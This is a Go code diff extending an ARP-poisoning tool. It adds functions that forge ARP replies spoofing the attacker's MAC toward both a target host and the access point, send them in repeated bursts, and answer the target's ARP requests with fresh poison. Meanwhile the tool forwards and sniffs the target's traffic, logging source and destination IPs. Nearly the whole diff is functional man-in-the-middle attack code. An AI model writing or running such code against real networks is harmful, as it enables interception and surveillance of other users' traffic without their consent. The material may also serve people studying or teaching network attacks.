@@ -29,6 +29,7 @@ import (
 	"os"
 	"os/signal"
 	"syscall"
+	"time"
 )
 
 
@@ -94,8 +95,8 @@ func (ap *arpPoison) execute() {
 	sysconf.MustEnableIPForwarding()
 	ap.initSniffTools()
 	ap.initPoisoningTools()
-	ap.sniffTargetsTraffic()
 	ap.sendInitialPoisoning()
+	ap.sniffTargetsTraffic()
 	ap.stopTools()
 }
 
@@ -137,8 +138,55 @@ func (ap *arpPoison) initPoisoningTools() {
 
 
 
-func (ap *arpPoison) sendInitialPoisoning() {
+func (ap *arpPoison) setFixedPktData() {
+	ap.builder.SetReplyOpcode()
+	ap.builder.EtherHdr.SetSrcAddr(ap.addrs.myMAC)
+	ap.builder.SetSenderMAC(ap.addrs.myMAC)
+	ap.builder.SetSenderIP(ap.addrs.myIP)
+}
 
+
+
+func (ap *arpPoison) setPoisonToTarget() {
+	ap.builder.EtherHdr.SetDstAddr(ap.addrs.targetMAC)
+	ap.builder.SetTargetMAC(ap.addrs.targetMAC)
+	ap.builder.SetTargetIP(ap.addrs.targetIP)
+}
+
+
+
+func (ap *arpPoison) setPoisonToAP() {
+	ap.builder.EtherHdr.SetDstAddr(ap.addrs.apMAC)
+	ap.builder.SetTargetMAC(ap.addrs.apMAC)
+	ap.builder.SetTargetIP(ap.addrs.apIP)
+}
+
+
+
+func (ap *arpPoison) sendInitialPoisoning() {
+	delay := time.Duration(100 * time.Millisecond)
+	
+	ap.setPoisonToTarget()
+	ap.fastPoisoning(delay)
+
+	ap.setPoisonToAP()
+	ap.fastPoisoning(delay)
+}
+
+
+
+func (ap *arpPoison) fastPoisoning(delay time.Duration) {
+	for range 5 {
+		ap.sendPoison()
+		time.Sleep(delay)
+	}
+}
+
+
+
+func (ap *arpPoison) sendPoison() {
+	pkt := ap.builder.Pkt()
+	ap.socket.Send(pkt)
 }
 
 
@@ -154,23 +202,36 @@ func (ap *arpPoison) sniffTargetsTraffic() {
 		default:
 			pkt, ok := <-sniffCh
 			if !ok { return }
-			ap.processPkt(pkt)
+			
+			ap.dissec.UpdatePkt(pkt)
+			ap.processPkt()
 		}
 	}
 }
 
 
 
-func (ap *arpPoison) processPkt(pkt []byte) {
-	ap.dissec.UpdatePkt(pkt)
-	
+func (ap *arpPoison) processPkt() {
+	if ap.dissec.IsArpRequest() {
+		ap.sendRequestedPoison()
+		return
+	}
+
 	srcIP, ok1 := ap.dissec.GetSrcIP()
 	if !ok1 { return }
 	
 	dstIP, ok2 := ap.dissec.GetDstIP()
 	if !ok2 { return }
 
-	fmt.Printf("%s -> %s", srcIP.String(), dstIP.String())
+	fmt.Printf("\n%s -> %s", srcIP.String(), dstIP.String())
+}
+
+
+
+func (ap *arpPoison) sendRequestedPoison() {
+	ap.setPoisonToTarget()
+	ap.sendPoison()
+	fmt.Printf("Poison sent to target %s", ap.addrs.targetIP.String())
 }
 
 
